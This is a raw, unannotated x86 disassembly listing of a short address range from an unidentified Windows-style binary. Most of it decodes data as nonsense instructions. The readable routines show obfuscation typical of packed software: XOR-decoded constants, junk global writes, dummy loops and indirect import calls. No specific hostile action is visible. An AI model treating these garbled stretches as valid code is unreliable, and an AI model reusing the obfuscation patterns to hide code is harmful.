  4052ec:	js     0x4052bc
  4052ee:	dec    esp
  4052ef:	(bad)
  4052f3:	sub    eax,0x82834e41
  4052f8:	pop    edi
  4052f9:	imul   esp,DWORD PTR [edi+0x5a1a0e43],0x3d9c64e8
  405303:	mov    edi,0xf4c15fb6
  405308:	into   
  405309:	mov    esi,0x7822dca3
  40530e:	adc    eax,0x3029797e
  405313:	icebp  
  405314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405315:	fdivr  DWORD PTR [ebp+0x7b]
  405318:	out    0x1b,al
  40531a:	or     DWORD PTR [esi+0x2e],0xa35785c1
  405321:	xchg   ebp,eax
  405322:	jl     0x405358
  405324:	stc    
  405325:	retf   
  405326:	mov    ds:0xfe19c3bc,al
  40532b:	and    ebx,DWORD PTR [ebx]
  40532d:	stos   BYTE PTR es:[edi],al
  40532e:	pop    edi
  40532f:	cdq    
  405330:	add    DWORD PTR [ebp-0x48],0x85e74d1f
  405337:	rcl    BYTE PTR [edi+0x1a94ea6f],1
  40533d:	sub    al,0xca
  40533f:	leave  
  405340:	inc    edx
  405341:	bound  esi,QWORD PTR [ecx]
  405343:	cwde   
  405344:	in     eax,dx
  405345:	sbb    al,0xf7
  405347:	dec    edx
  405348:	mov    dh,0xbe
  40534a:	cmc    
  40534b:	sub    dl,BYTE PTR ds:0x203bcbc6
  405351:	mov    edi,0x79a3066f
  405356:	or     DWORD PTR ds:0xaeb37ccf,eax
  40535c:	aam    0x26
  40535e:	add    eax,0x7d5b7e77
  405363:	popf   
  405364:	mov    esp,0x7ff208fb
  405369:	shr    DWORD PTR [edi+0x6f],0xd9
  40536d:	xchg   esp,eax
  40536e:	addr16 loope 0x405300
  405371:	jnp    0x4053a0
  405373:	mov    al,ds:0xd5db5613
  405378:	sbb    al,0x8
  40537a:	pusha  
  40537b:	les    ebx,FWORD PTR [esi-0x330951af]
  405381:	push   es
  405382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405383:	cmp    eax,0x905419ea
  405388:	into   
  405389:	ror    ebp,cl
  40538b:	mov    cl,0xf5
  40538d:	mov    dl,0x18
  40538f:	daa    
  405390:	push   esp
  405391:	sbb    DWORD PTR [esi-0x1f],ebx
  405394:	ins    BYTE PTR es:[edi],dx
  405395:	imul   ebp,DWORD PTR [ecx-0x64],0x5c0f932f
  40539c:	pop    ebp
  40539d:	jmp    0x4053c2
  40539f:	mov    ds:0xc08ad12c,al
  4053a4:	xchg   edi,eax
  4053a5:	jle    0x40541d
  4053a7:	call   0xcdee:0x3cfe6879
  4053ae:	pop    eax
  4053af:	xchg   BYTE PTR [esp+ebx*2-0x3a],ah
  4053b3:	fbld   TBYTE PTR [ecx]
  4053b5:	push   edx
  4053b6:	inc    esp
  4053b7:	xor    BYTE PTR [edx],cl
  4053b9:	test   DWORD PTR [eax+0x2653374a],0xa1213161
  4053c3:	stc    
  4053c4:	popf   
  4053c5:	lods   eax,DWORD PTR ds:[esi]
  4053c6:	jg     0x405379
  4053c8:	sahf   
  4053c9:	popa   
  4053ca:	jmp    0x92076cde
  4053cf:	cwde   
  4053d0:	mov    ebp,0xe74dcfe9
  4053d5:	mov    bh,0x7a
  4053d7:	and    BYTE PTR [ebx-0x5b2240c9],al
  4053dd:	in     al,0x2d
  4053df:	in     al,0xed
  4053e1:	cmp    BYTE PTR [edi],bl
  4053e3:	les    esi,FWORD PTR [eax]
  4053e5:	out    dx,eax
  4053e6:	sub    edx,DWORD PTR [ebp-0x34]
  4053e9:	mov    ebx,DWORD PTR [edx+eax*8]
  4053ec:	fidiv  DWORD PTR [esp+eax*1+0x1f407af1]
  4053f3:	cdq    
  4053f4:	pushf  
  4053f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f6:	inc    ebx
  4053f7:	push   ebx
  4053f8:	dec    edx
  4053f9:	jns    0x40540e
  4053fb:	or     bh,ch
  4053fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053fe:	push   esi
  4053ff:	test   al,0x8d
  405401:	add    BYTE PTR [ebp+0x4cb17fdc],dh
  405407:	push   cs
  405408:	sbb    BYTE PTR [esi+0x360956fb],bh
  40540e:	repz jmp 0x3322373c
  405414:	sub    BYTE PTR [esi],ah
  405416:	add    al,BYTE PTR [ecx-0x11d4d082]
  40541c:	fwait
  40541d:	jp     0x405453
  40541f:	std    
  405420:	popa   
  405421:	(bad)  [ebp+0x1b69e31a]
  405427:	lds    ecx,FWORD PTR [ecx+eax*1]
  40542a:	jle    0x4053d0
  40542c:	xchg   ecx,eax
  40542d:	xor    BYTE PTR [ebx+0x3584e6ca],al
  405433:	stos   DWORD PTR es:[edi],eax
  405434:	xchg   BYTE PTR [edi-0x3fef4ca4],ah
  40543a:	push   ss
  40543b:	adc    eax,0x5ab7703e
  405440:	pop    eax
  405441:	pop    ebp
  405442:	cmp    al,0xe
  405444:	mov    ch,0xf4
  405446:	mov    al,ds:0x6372186f
  40544b:	cdq    
  40544c:	call   0xb2e894b9
  405451:	mov    ebp,0x487267f5
  405456:	jp     0x4053d8
  405458:	jae    0x4054b4
  40545a:	inc    edi
  40545b:	arpl   dx,si
  40545d:	dec    ebx
  40545e:	mov    ch,0x4a
  405460:	sbb    al,0x49
  405462:	cmp    esi,DWORD PTR [edx]
  405464:	inc    ecx
  405465:	imul   edi,esp,0xffffffaa
  405468:	cmp    edi,DWORD PTR [edi-0x1c956b17]
  40546e:	sub    ch,bh
  405470:	fmulp  st(6),st
  405472:	inc    ecx
  405473:	dec    edi
  405474:	jmp    0x8a2dae88
  405479:	inc    edx
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x61a2c60a
  4055e5:	push   esi
  4055e6:	add    BYTE PTR [edi],dh
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x4055de
  4055f1:	mov    ebx,0xe3ebcc18
  4055f6:	lock pop esp
  4055f8:	mov    ecx,0xb8f768c1
  4055fd:	jo     0x40558a
  4055ff:	xor    al,0x4e
  405601:	mov    ds:0x87505996,al
  405606:	jge    0x405657
  405608:	adc    ebx,edx
  40560a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40560b:	jne    0x405591
  40560d:	push   DWORD PTR [ecx+0x7]
  405610:	jmp    0xb51805c3
  405615:	outs   dx,BYTE PTR ds:[esi]
  405616:	sub    esp,0xffffffdd
  405619:	loop   0x405677
  40561b:	sbb    edx,DWORD PTR [eax+0x7617ea3a]
  405621:	push   ebx
  405622:	out    0xb9,eax
  405624:	lods   al,BYTE PTR ds:[esi]
  405625:	and    eax,0x5ae9577f
  40562a:	imul   ebx,DWORD PTR ds:0x70fb4d16,0x6d
  405631:	sub    al,0x87
  405633:	xor    al,0xdc
  405635:	mov    ds:0x4134aceb,eax
  40563a:	pop    ds
  40563b:	adc    eax,0x8d376bd
  405640:	adc    eax,0x69cae37
  405645:	repnz push 0x398027a7
  40564b:	not    BYTE PTR [edi]
  40564d:	mov    esp,0x77852087
  405652:	push   ss
  405653:	xor    al,0xe9
  405655:	pop    ds
  405656:	inc    ebx
  405657:	inc    eax
  405658:	jbe    0x4056b3
  40565a:	inc    edi
  40565b:	mov    cl,0xf7
  40565d:	mov    ebx,0xb810aafa
  405662:	ret    0x1983
  405665:	xor    DWORD PTR [esi+0x9],0x5004450d
  40566c:	pop    ebx
  40566d:	inc    ebx
  40566e:	ror    si,0x1f
  405672:	stos   DWORD PTR es:[edi],eax
  405673:	and    al,0x9
  405675:	sti    
  405676:	xchg   esp,eax
  405677:	cmp    ch,cl
  405679:	adc    DWORD PTR es:[ebp-0x5b],0x4a
  40567e:	and    BYTE PTR [ecx+0x3ddfc9fe],bl
  405684:	jno    0x405646
  405686:	pusha  
  405687:	call   DWORD PTR [eax]
  405689:	jl     0x4056b4
  40568b:	cmp    al,0x43
  40568d:	pop    edi
  40568e:	out    0x53,al
  405690:	and    al,0xc4
  405692:	sbb    BYTE PTR [ecx+esi*2],bh
  405695:	cs clc 
  405697:	mov    ebp,0xeec7a8fb
  40569c:	bound  esp,QWORD PTR [ecx+0x56953168]
  4056a2:	push   es
  4056a3:	adc    DWORD PTR [edx+0x6807ce5a],edx
  4056a9:	fs push 0xad2e7c5
  4056af:	push   edx
  4056b0:	les    esi,FWORD PTR [eax-0x7e9d3b0a]
  4056b6:	mov    cl,0xb8
  4056b8:	mov    BYTE PTR [edx+0x432a758b],0xec
  4056bf:	into   
  4056c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c1:	imul   edx,DWORD PTR [edx+0xc3265e8],0xffffffe3
  4056c8:	xchg   DWORD PTR [eax-0xa6b00e3],edi
  4056ce:	add    al,0xe2
  4056d0:	ins    DWORD PTR es:[edi],dx
  4056d1:	in     eax,0x89
  4056d3:	push   eax
  4056d4:	ins    DWORD PTR es:[edi],dx
  4056d5:	xchg   ebx,eax
  4056d6:	pop    ebp
  4056d7:	mov    ebp,edx
  4056d9:	in     al,0xef
  4056db:	stos   BYTE PTR es:[edi],al
  4056dc:	pop    ds
  4056dd:	leave  
  4056de:	enter  0xa619,0x54
  4056e2:	push   edi
  4056e3:	mov    eax,0xf732cb9
  4056e8:	div    ebx
  4056ea:	gs je  0x4056e2
  4056ed:	xchg   edi,eax
  4056ee:	int    0x7e
  4056f0:	push   0x36
  4056f2:	sar    BYTE PTR [eax+0x15],0x17
  4056f6:	stos   BYTE PTR es:[edi],al
  4056f7:	cmp    al,0x5c
  4056f9:	and    al,0xbf
  4056fb:	mov    esi,0x6084bb83
  405700:	mov    al,ds:0x8f0cf2a9
  405705:	adc    eax,0x7dc64a77
  40570a:	jb     0x4056c1
  40570c:	pop    edi
  40570d:	dec    ebx
  40570e:	retf   0x116
  405711:	lods   eax,DWORD PTR ds:[esi]
  405712:	leave  
  405713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405714:	dec    esp
  405715:	inc    eax
  405716:	sub    DWORD PTR [ebp+0x7],esi
  405719:	inc    esi
  40571a:	gs (bad) 
  40571c:	sbb    edx,esp
  40571e:	call   0x7bf45869
  405723:	fcom   st(0)
  405725:	sbb    dh,cl
  405727:	pusha  
  405728:	xchg   ebx,eax
  405729:	imul   ecx,DWORD PTR [ecx-0x17463582],0xe5372f78
  405733:	ins    BYTE PTR es:[edi],dx
  405734:	hlt    
  405735:	add    eax,0x2e913457
  40573a:	scas   eax,DWORD PTR es:[edi]
  40573b:	xchg   BYTE PTR [eax-0x5f],ah
  40573e:	sbb    DWORD PTR [ecx+0x73],ebp
  405741:	stos   BYTE PTR es:[edi],al
  405742:	pop    esi
  405743:	dec    edx
  405744:	sub    eax,0x53e208d1
  405749:	imul   eax,DWORD PTR [edi],0x8960f0c5
  40574f:	lods   eax,DWORD PTR ds:[esi]
  405750:	fld    DWORD PTR [ebx-0x56]
  405753:	or     eax,0x7eb440b6
  405758:	mov    ah,0xc5
  40575a:	inc    edx
  40575b:	push   es
  40575c:	pop    edx
  40575d:	mov    DWORD PTR [ebx+0x237a6dd8],0x468955e8
  405767:	shl    dh,1
  405769:	push   edi
  40576a:	inc    edi
  40576b:	pop    es
  40576c:	rcl    ecx,cl
  40576e:	xchg   ecx,eax
  40576f:	rcl    BYTE PTR [edi-0x27],1
  405772:	clc    
  405773:	retf   
  405774:	push   0x271e6b80
  405779:	test   DWORD PTR [esi+0x377c903e],ebx
  40577f:	mov    cs:0xc755faaf,al
  405785:	ins    DWORD PTR es:[edi],dx
  405786:	dec    eax
  405787:	jg     0x405723
  405789:	mov    ?,WORD PTR [edx]
  40578b:	mov    ds:0xc01b86e9,eax
  405790:	ds push edi
  405792:	stos   BYTE PTR es:[edi],al
  405793:	mov    al,ds:0x85c2b105
  405798:	ret    
  405799:	add    eax,DWORD PTR [ecx-0x318fb3d8]
  40579f:	std    
  4057a0:	push   0x5a
  4057a2:	cwde   
  4057a3:	inc    ebp
  4057a4:	nop
  4057a5:	fdiv   DWORD PTR [ecx-0x603fccb3]
  4057ab:	aad    0xb
  4057ad:	std    
  4057ae:	inc    esi
  4057af:	std    
  4057b0:	mov    edi,0x69b9407c
  4057b5:	daa    
  4057b6:	adc    BYTE PTR [edx-0x3c33f9d3],ah
  4057bc:	stos   DWORD PTR es:[edi],eax
  4057bd:	xor    eax,0x10b91286
  4057c2:	hlt    
  4057c3:	test   eax,0xf005c016
  4057c8:	(bad)  
  4057ca:	cmp    eax,0x31cc45c7
  4057cf:	add    eax,0x5c7f89f
  4057d4:	pop    ebx
  4057d5:	in     al,dx
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42ec5b3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	cdq    
  4059a3:	cmp    ah,BYTE PTR [edi-0x55]
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059da
  4059af:	push   0xffffffb9
  4059b1:	in     eax,0xe5
  4059b3:	xchg   BYTE PTR [ebp+0x1a],cl
  4059b6:	call   0xec9b:0xa5dfb3b6
  4059bd:	hlt    
  4059be:	gs dec edx
  4059c0:	sti    
  4059c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059c2:	out    0x36,eax
  4059c4:	or     BYTE PTR [edi+0x14],dl
  4059c7:	inc    esp
  4059c8:	mov    esi,0xf676b85d
  4059cd:	call   0x8e150dc1
  4059d2:	inc    ebp
  4059d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d4:	xlat   BYTE PTR ds:[ebx]
  4059d5:	dec    esp
  4059d6:	mov    dl,BYTE PTR [ebx+0x636a24e9]
  4059dc:	pusha  
  4059dd:	mov    al,ds:0x140f6bf2
  4059e2:	mov    ds,WORD PTR [edi+0x705988ba]
  4059e8:	sbb    DWORD PTR [ebx],eax
  4059ea:	mov    ds:0x60a1cb65,al
  4059ef:	outs   dx,DWORD PTR ds:[esi]
  4059f0:	mov    ebp,0x4ad84a2b
  4059f5:	(bad)  
  4059f6:	jbe    0x405a3c
  4059f8:	fsub   DWORD PTR [ebp+0x57]
  4059fb:	sar    cl,0x6
  4059fe:	repnz adc DWORD PTR ds:0x9ffcc1ec,edx
  405a05:	adc    ch,ch
  405a07:	frstor ds:0x18bc2ada
  405a0d:	fs es stos DWORD PTR es:[edi],eax
  405a10:	std    
  405a11:	xchg   esp,eax
  405a12:	std    
  405a13:	rcr    ah,1
  405a15:	ficomp DWORD PTR [ebx]
  405a17:	dec    esp
  405a18:	mov    dh,0x83
  405a1a:	shl    DWORD PTR [ebx],1
  405a1c:	mov    dh,0x93
  405a1e:	mov    edi,0x38b3fb0c
  405a23:	and    al,0x77
  405a25:	xor    ecx,DWORD PTR [ecx-0x2e]
  405a28:	push   0x12
  405a2a:	test   al,0x91
  405a2c:	xchg   esp,eax
  405a2d:	(bad)  fs:[esi-0x1fc88873]
  405a34:	mov    dl,0xa8
  405a36:	add    al,0x10
  405a38:	addr16 jnp 0x405a01
  405a3b:	mov    ch,0x17
  405a3d:	and    eax,0x309fc675
  405a42:	or     BYTE PTR [ebx],ch
  405a44:	in     eax,dx
  405a45:	xchg   ebp,eax
  405a46:	xor    al,0x6d
  405a48:	dec    ebx
  405a49:	cmp    DWORD PTR [ebp+0x55422e32],0x2d
  405a50:	ss jecxz 0x405aad
  405a53:	mov    al,ds:0x3475a27b
  405a58:	dec    ecx
  405a59:	xor    al,0x22
  405a5b:	out    dx,eax
  405a5c:	xchg   ecx,eax
  405a5d:	push   eax
  405a5e:	xchg   esp,eax
  405a5f:	add    al,0xac
  405a61:	shl    DWORD PTR [edi+0x11efbf53],0x1d
  405a68:	jo     0x405aa2
  405a6a:	and    eax,0x4371e71c
  405a6f:	push   es
  405a70:	add    esi,DWORD PTR ds:0x90e39f26
  405a76:	pusha  
  405a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a78:	sbb    al,0xa4
  405a7a:	jnp    0x405a77
  405a7c:	test   BYTE PTR [edi],0xb5
  405a7f:	call   0xe249459b
  405a84:	mov    bh,cl
  405a86:	jecxz  0x405ace
  405a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a89:	dec    ebx
  405a8a:	mov    eax,ds:0xf7ac05dc
  405a8f:	pop    esp
  405a90:	jb     0x405a2c
  405a92:	popa   
  405a93:	rcr    DWORD PTR [edx-0x162130d8],1
  405a99:	(bad)
  405a9c:	fs jmp 0x70bb:0xf263ba9e
  405aa4:	mov    dh,0xa5
  405aa6:	sub    dl,dl
  405aa8:	loopne 0x405a78
  405aaa:	popa   
  405aab:	popa   
  405aac:	retf   0x1ccf
  405aaf:	aam    0x5c
  405ab1:	fstp   DWORD PTR [ebp-0x3a017360]
  405ab7:	in     eax,0xb2
  405ab9:	fstp   DWORD PTR [ebp+edx*4-0x479e1902]
  405ac0:	test   eax,0x1991eb62
  405ac5:	xlat   BYTE PTR ds:[ebx]
  405ac6:	xchg   edi,eax
  405ac7:	adc    BYTE PTR [edx+0x4283b6ff],0x6c
  405ace:	in     al,dx
  405acf:	jmp    0x2f5b:0xdd8cc227
  405ad6:	mov    BYTE PTR [ecx],al
  405ad8:	mov    ebp,0xde298417
  405add:	shr    DWORD PTR [eax+0x75367837],1
  405ae3:	ret    
  405ae4:	fscale 
  405ae6:	out    dx,al
  405ae7:	jno    0x405a6e
  405ae9:	xchg   esp,eax
  405aea:	sahf   
  405aeb:	jp     0x405a88
  405aed:	mov    al,dl
  405aef:	push   ss
  405af0:	addr16 fs int 0x97
  405af4:	maskmovq mm1,(bad)
  405af5:	test   DWORD PTR [ecx-0x2df85df9],0xd6a5723
  405aff:	xchg   ecx,eax
  405b00:	sahf   
  405b01:	xchg   esp,eax
  405b02:	sub    DWORD PTR [edx-0x57],esi
  405b05:	ja     0x405b37
  405b07:	(bad)  
  405b08:	cli    
  405b09:	(bad)
  405b0c:	inc    ecx
  405b0d:	pop    edi
  405b0e:	add    bh,BYTE PTR [esi]
  405b10:	stos   BYTE PTR es:[edi],al
  405b11:	sub    ebp,DWORD PTR [eax+ecx*4+0x7b70be52]
  405b18:	aam    0x4c
  405b1a:	(bad)  
  405b1b:	(bad)  [ebx]
  405b1d:	les    esi,FWORD PTR [esi-0x342b695a]
  405b23:	cli    
  405b24:	push   ss
  405b25:	pop    es
  405b26:	or     eax,DWORD PTR [ecx]
  405b28:	mov    dh,0x5d
  405b2a:	and    esi,ebx
  405b2c:	nop
  405b2d:	ror    BYTE PTR [edi-0x8],cl
  405b30:	xchg   ebp,eax
  405b31:	cli    
  405b32:	ja     0x405ae6
  405b34:	js     0x405afa
  405b36:	pop    ebx
  405b37:	mov    BYTE PTR [esi+0x1b],bh
  405b3a:	inc    eax
  405b3b:	das    
  405b3c:	xchg   ecx,eax
  405b3d:	aaa    
  405b3e:	and    al,0xa1
  405b40:	enter  0x49a2,0xa8
  405b44:	iret   
  405b45:	dec    edx
  405b46:	fsubr  DWORD PTR [ecx]
  405b48:	jmp    0x75b24b7e
  405b4d:	xor    eax,0x42754360
  405b52:	fcomp  DWORD PTR [esi+esi*1+0x33d7ec96]
  405b59:	jl     0x405ae1
  405b5b:	xlat   BYTE PTR ds:[ebx]
  405b5c:	sub    al,0xa2
  405b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b5f:	xor    ecx,ecx
  405b61:	and    bl,BYTE PTR [ebx+0x17]
  405b64:	lds    esi,FWORD PTR [ebp-0x743635cb]
  405b6a:	cli    
  405b6b:	xchg   esp,eax
  405b6c:	xchg   ecx,eax
  405b6d:	gs or  ch,ah
  405b70:	adc    esi,DWORD PTR [esi-0x3c327abe]
  405b76:	push   0x75
  405b78:	push   eax
  405b79:	cmc    
  405b7a:	int    0x3b
  405b7c:	rol    BYTE PTR [esi+0x33664251],cl
  405b82:	dec    edx
  405b83:	sub    eax,0xb98b4d17
  405b88:	cmp    eax,0x33ec458b
  405b8d:	mov    BYTE PTR [ebx],0xc7
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	dec    esp
  405bac:	xchg   edx,eax
  405bad:	mov    ds:0x7e2960a2,eax
  405bb2:	jle    0x405c09
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405bce
  405bb8:	mov    ecx,0x603303e3
  405bbd:	cmp    DWORD PTR [edi-0x5b064306],ecx
  405bc3:	xchg   ecx,eax
  405bc4:	jne    0x405baf
  405bc6:	ja     0x405b83
  405bc8:	push   0xb5d44b58
  405bcd:	sbb    eax,0xa65957ba
  405bd2:	or     DWORD PTR [ebp+0xe669457],edi
  405bd8:	xchg   BYTE PTR [edi+0x1d],bl
  405bdb:	inc    ecx
  405bdc:	push   0x19
  405bde:	jmp    0x1831ff01
  405be3:	iret   
  405be4:	outs   dx,DWORD PTR ds:[esi]
  405be5:	mov    edi,0x207ce7b5
  405bea:	out    0x30,al
  405bec:	xchg   BYTE PTR [esi+0x33],dl
  405bef:	mov    cl,0x2d
  405bf1:	imul   esi,esi,0xffffffa4
  405bf4:	cmp    DWORD PTR [ebx+ebx*1+0x62],ecx
  405bf8:	lods   eax,DWORD PTR ds:[esi]
  405bf9:	popa   
  405bfa:	inc    DWORD PTR gs:[edx+0x3c]
  405bfe:	test   eax,0x5b3652a7
  405c03:	xchg   ecx,eax
  405c04:	mov    bl,0xf3
  405c06:	and    BYTE PTR [ebx+0x2f],ch
  405c09:	lds    esp,FWORD PTR [edx+edi*1]
  405c0c:	adc    edi,DWORD PTR [edx]
  405c0e:	lods   al,BYTE PTR ds:[esi]
  405c0f:	mov    edi,DWORD PTR [ebp-0x48]
  405c12:	clc    
  405c13:	cmp    eax,DWORD PTR [edx-0x3c]
  405c16:	popa   
  405c17:	cdq    
  405c18:	sub    eax,0x458ca421
  405c1d:	sti    
  405c1e:	push   cs
  405c1f:	and    al,0x23
  405c21:	xchg   ecx,eax
  405c22:	dec    ecx
  405c23:	adc    al,0x50
